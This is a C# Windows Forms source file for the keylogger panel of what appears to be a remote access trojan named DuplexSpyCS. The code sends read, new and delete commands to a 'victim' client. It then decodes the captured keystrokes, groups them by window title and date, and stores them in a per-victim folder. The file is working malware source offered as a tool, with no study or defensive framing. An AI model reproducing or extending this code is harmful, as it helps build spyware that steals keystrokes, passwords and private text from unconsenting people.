using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.ComponentModel.DataAnnotations;
using System.Data.Entity.Core.Mapping;
using System.Diagnostics;

namespace DuplexSpyCS
{
    /* Name: Keylogger Function
     * Author: ISSAC
     * Description: 
     *      Read keylogger file(RTF) from remote client and display data in winform. 
     *      It will save the result from rich textbox into local(server).
     * Terminology: 
     *      Local refresh: Read local RTF file again.
            Remote refresh: Read remote RTF file again.
     */

    public partial class frmKeyLogger : Form
    {
        public clsVictim v;
        private Dictionary<string, List<string>> dic_kl = new Dictionary<string, List<string>>();
        private Dictionary<string, Dictionary<string, List<string>>> dic_date = new Dictionary<string, Dictionary<string, List<string>>>();

        private List<TreeNode> ls_tnTitle = new List<TreeNode>();
        private List<TreeNode> ls_tnDate = new List<TreeNode>();

        public frmKeyLogger()
        {
            InitializeComponent();
        }

        private void RegexSearch(int idx_start, string text)
        {
            if (idx_start >= richTextBox1.Text.Length)
            {
                MessageBox.Show("Not found", "Search", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                richTextBox1.Tag = 0;

                return;
            }

            int idx_wordStart = richTextBox1.Find(text, idx_start, richTextBox1.Text.Length, RichTextBoxFinds.None);

            if (idx_wordStart != -1)
            {
                richTextBox1.HideSelection = false;
                richTextBox1.SelectionStart = idx_wordStart;
                richTextBox1.SelectionLength = text.Length;
                richTextBox1.Tag = idx_wordStart + text.Length;

                richTextBox1.ScrollToCaret();
            }
            else
            {
                MessageBox.Show("Not found", "Search", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                richTextBox1.Tag = 0;
            }
        }

        private void RegexFind(string title)
        {
            richTextBox1.Clear();

            int count = 0;

            if (title == null)
                title = string.Empty;

            foreach (string txt_title in dic_kl.Keys)
            {
                if (txt_title.Contains(title))
                {
                    richTextBox1.AppendText($"{txt_title}{Environment.NewLine}");
                    richTextBox1.AppendText($"{string.Join("", dic_kl[txt_title].ToArray())}");

                    richTextBox1.AppendText(Environment.NewLine);
                    richTextBox1.AppendText("\r\n");

                    count++;
                }
            }

            toolStripStatusLabel1.Text = $"Action successfully. Result[{count}]";
        }

        private TreeNode FindTreeNode(TreeNodeCollection Nodes, string pattern)
        {
            TreeNode tgt_node = null;
            Invoke(new Action(() =>
            {
                foreach (TreeNode node in Nodes)
                {
                    if (node.Tag != null && node.Tag.ToString() == pattern)
                    {
                        tgt_node = node;
                        break;
                    }
                }
            }));

            return tgt_node;
        }

        public void ShowKeyLogger(string d1, string d2)
        {
            dic_kl.Clear();

            Invoke(new Action(() =>
            {
                textBox2.Text = clsCrypto.b64D2Str(d1); //Path
                
                richTextBox1.Clear();
                treeView1.Nodes.Clear();
                treeView2.Nodes.Clear();
                
                ls_tnTitle.Clear();
                ls_tnDate.Clear();

                toolStripStatusLabel1.Text = "Processing keylogger file...";
            }));

            string data = clsCrypto.b64D2Str(d2); //Data
            string last_title = null;
            string last_txt_title = null;
            string[] aDatas = clsCrypto.b64D2Str(d2).Split(Environment.NewLine);

            Invoke(new Action(() =>
            {
                toolStripProgressBar1.Maximum = aDatas.Length;
                toolStripProgressBar1.Value = 0;

                toolStripStatusLabel1.Text = "Processing data...";
            }));

            foreach (string row in aDatas)
            {
                try
                {
                    if (string.IsNullOrEmpty(row.Trim()))
                        continue;

                    string dec_row = clsCrypto.b64D2Str(row);
                    string[] s = dec_row.Split("|");
                    string title = clsCrypto.b64D2Str(s[0]);
                    string date = clsCrypto.b64D2Str(s[1]);
                    string key = clsCrypto.b64D2Str(s[2]);

                    DateTime datetime = DateTime.Parse(date);
                    string new_date = datetime.ToString("yyyy/MM/dd"); //datetime.ToString("yyyy/MM/dd/HH");

                    if (last_title != title)
                    {
                        if (last_title != null)
                        {
                            Invoke(new Action(() =>
                            {
                                richTextBox1.AppendText(Environment.NewLine);
                                richTextBox1.AppendText("\r\n");
                            }));
                        }

                        last_txt_title = $"[{title}] - {date}";
                        last_title = title;

                        Invoke(new Action(() => richTextBox1.AppendText($"{last_txt_title}{Environment.NewLine}{key}")));

                        if (!dic_kl.ContainsKey(last_txt_title))
                            dic_kl[last_txt_title] = new List<string> { key };

                        //Add title into treeview
                        TreeNode find_node = FindTreeNode(treeView1.Nodes, title);
                        if (find_node == null && !string.IsNullOrEmpty(title))
                        {
                            TreeNode node = new TreeNode(title);
                            node.Tag = title;

                            Invoke(new Action(() => treeView1.Nodes.Add(node)));

                            ls_tnTitle.Add(node);
                        }

                        //Set treeNode tag
                        find_node = FindTreeNode(treeView2.Nodes, new_date);
                        if (find_node == null)
                        {
                            //Add to treeView2
                            TreeNode node = new TreeNode(new_date);
                            node.Tag = new_date; //Set data time

                            Invoke(new Action(() => treeView2.Nodes.Add(node)));

                            ls_tnDate.Add(node);

                            //Add to dictionary
                            if (!dic_date.ContainsKey(new_date))
                            {
                                Dictionary<string, List<string>> tmp_dic = new Dictionary<string, List<string>>();
                                tmp_dic[last_txt_title] = new List<string>() { key };
                                dic_date[new_date] = tmp_dic;
                            }
                        }
                        else
                        {
                            if (!dic_date.ContainsKey(new_date))
                                dic_date[new_date] = new Dictionary<string, List<string>>();

                            dic_date[new_date][last_txt_title] = new List<string> { key };
                        }
                    }
                    else
                    {
                        Invoke(new Action(() => richTextBox1.AppendText(key)));
                        if (!dic_kl.ContainsKey(last_txt_title))
                            dic_kl[last_txt_title] = new List<string>();
                        dic_kl[last_txt_title].Add(key);

                        if (!dic_date.ContainsKey(new_date))
                            dic_date[new_date] = new Dictionary<string, List<string>>();
                        if (!dic_date[new_date].ContainsKey(last_txt_title))
                            dic_date[new_date][last_txt_title] = new List<string>();

                        dic_date[new_date][last_txt_title].Add(key);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    Invoke(new Action(() => toolStripProgressBar1.Increment(1)));
                }
            }

            string file_keylogger = Path.Combine(v.dir_victim, "keylogger.rtf");

            Invoke(new Action(() =>
            {
                File.WriteAllText(file_keylogger, richTextBox1.Text);

                richTextBox1.SelectionStart = richTextBox1.Text.Length;
                richTextBox1.ScrollToCaret();

                toolStripStatusLabel1.Text = $"Action successfully. Result[{dic_kl.Keys.Count}]";
            }));
        }

        void tv1_AfterSelect()
        {
            string file = Path.Combine(v.dir_victim, "keylogger.rtf");
            if (!File.Exists(file))
            {
                MessageBox.Show("File not found: " + file, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            TreeNode selected_node = treeView1.SelectedNode;
            string title = selected_node.Text;

            RegexFind(title);
        }
        void tv2_AfterSelect(string szDate)
        {
            richTextBox1.Clear();

            Dictionary<string, List<string>> dic = dic_date[szDate];
            foreach (string title in dic.Keys)
            {
                richTextBox1.AppendText(title);
                richTextBox1.AppendText(Environment.NewLine);

                richTextBox1.AppendText(string.Join("", dic[title]));
                richTextBox1.AppendText("\n\n");
            }
        }

        void setup()
        {
            richTextBox1.Tag = 0;
            toolStripStatusLabel1.Text = "Loading...";

            v.fnSendCommand("keylogger|read");
        }

        private void frmKeyLogger_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            tv1_AfterSelect();
        }

        private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                switch (e.KeyCode)
                {
                    case Keys.F5: //Remote refresh
                        setup();
                        break;
                }
            }
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.F5:
                        RegexFind(null); //Local refresh
                        break;
                }
            }
        }

        private void treeView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Modifiers)
            {
                switch (e.KeyCode)
                {
                    case Keys.F5: //Remote refresh
                        setup();
                        break;
                }
            }
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.F5:
                        treeView1.SelectedNode = null;
                        RegexFind(null); //Local refresh
                        break;
                }
            }
        }
        //Save result
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = clsTools.GenerateFileName("rtf");
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, richTextBox1.Text);
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }
        //Decode keylogger RTF file.
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    ShowKeyLogger(clsCrypto.b64E2Str(ofd.FileName), clsCrypto.b64E2Str(File.ReadAllText(ofd.FileName)));
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
        //Open folder
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            Process.Start("explorer.exe", v.dir_victim);
        }
        //Open file
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    richTextBox1.Text = File.ReadAllText(ofd.FileName);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        //Local refresh
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            RegexFind(null);
        }
        //Goto top
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            richTextBox1.SelectionStart = 0;
            richTextBox1.ScrollToCaret();
        }
        //Goto bottom
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            richTextBox1.ScrollToCaret();
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                RegexSearch((int)richTextBox1.Tag, textBox1.Text);
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.Tag = 0;
        }

        //Remote - refresh
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            setup();
        }
        //Remote - new
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show("The remote keylogger file will be replaced, are you sure?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                v.SendCommand("keylogger|new");
            }
        }
        //Remoe - delete
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            DialogResult dr = MessageBox.Show("The remote keylogger file will be removed, are you sure?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dr == DialogResult.Yes)
            {
                v.SendCommand("keylogger|del");
            }
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
            tv2_AfterSelect(treeView2.SelectedNode.Text);
        }

        private void treeView2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {

            }
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.F5:
                        RegexFind(null);
                        break;
                }
            }
        }

        //tv - title filter
        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            treeView1.Nodes.Clear();

            foreach (TreeNode node in ls_tnTitle)
            {
                if (node.Text.Contains(textBox3.Text, StringComparison.OrdinalIgnoreCase))
                {
                    treeView1.Nodes.Add(node);
                }
            }
        }
        //tv - date filter
        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            treeView2.Nodes.Clear();

            foreach (TreeNode node in ls_tnDate)
            {
                if (node.Text.Contains(textBox4.Text, StringComparison.OrdinalIgnoreCase))
                {
                    treeView2.Nodes.Add(node);
                }
            }
        }
    }
}
